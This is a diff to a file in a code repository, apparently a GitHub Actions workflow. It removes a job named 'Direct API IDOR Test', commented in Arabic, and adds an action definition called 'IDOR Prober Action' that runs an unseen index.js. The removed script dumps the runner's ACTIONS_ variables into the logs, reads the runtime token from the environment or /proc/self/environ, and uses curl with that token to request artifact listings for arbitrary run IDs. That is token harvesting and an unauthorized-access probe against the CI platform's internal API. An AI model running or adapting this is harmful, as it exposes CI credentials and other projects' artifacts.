@@ -1,43 +1,5 @@
-name: Direct API IDOR Test
-on: [push]
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Extract Token and Probe API
-        run: |
-          # 1. استخراج الروابط والتوكن من بيئة الـ Runner
-          # نطبعها أولاً لنتأكد أنها موجودة في الـ Logs
-          echo "=== Extracting Internal Tokens ==="
-          env | grep -i ACTIONS_
-          
-          RUNTIME_URL=$(env | grep ACTIONS_RUNTIME_URL | cut -d'=' -f2-)
-          TOKEN=$(env | grep ACTIONS_RUNTIME_TOKEN | cut -d'=' -f2-)
-          
-          if [ -z "$RUNTIME_URL" ] || [ -z "$TOKEN" ]; then
-            echo "Tokens not found in standard env, trying memory..."
-            # محاولة أخيرة لقراءته من الذاكرة
-            RUNTIME_URL=$(cat /proc/self/environ | tr '\0' '\n' | grep ^ACTIONS_RUNTIME_URL= | cut -d'=' -f2-)
-            TOKEN=$(cat /proc/self/environ | tr '\0' '\n' | grep ^ACTIONS_RUNTIME_TOKEN= | cut -d'=' -f2-)
-          fi
-          
-          echo "Runtime URL: $RUNTIME_URL"
-          echo "Token Length: ${#TOKEN}"
-          
-          if [ -n "$RUNTIME_URL" ] && [ -n "$TOKEN" ]; then
-            echo "=== Probing Internal API for IDOR ==="
-            
-            # 2. إرسال طلبات IDOR إلى مسارات الـ Artifacts بأرقام Run ID عشوائية
-            for ID in 1 9999999999 100000000; do
-              TARGET_URL="${RUNTIME_URL}_apis/runs/${ID}/artifacts?api-version=6.0-preview.1"
-              echo "Probing: $TARGET_URL"
-              # استخدام curl لضرب الـ API
-              curl -s -o - -w "\nHTTP Status: %{http_code}\n" \
-                   -H "Authorization: Bearer $TOKEN" \
-                   -H "Accept: application/json" \
-                   "$TARGET_URL"
-              echo "-----------------------------------"
-            done
-          else
-            echo "Failed to extract tokens."
-          fi
+name: 'IDOR Prober Action'
+description: 'Probes internal APIs'
+runs:
+  using: 'node20'
+  main: 'index.js'
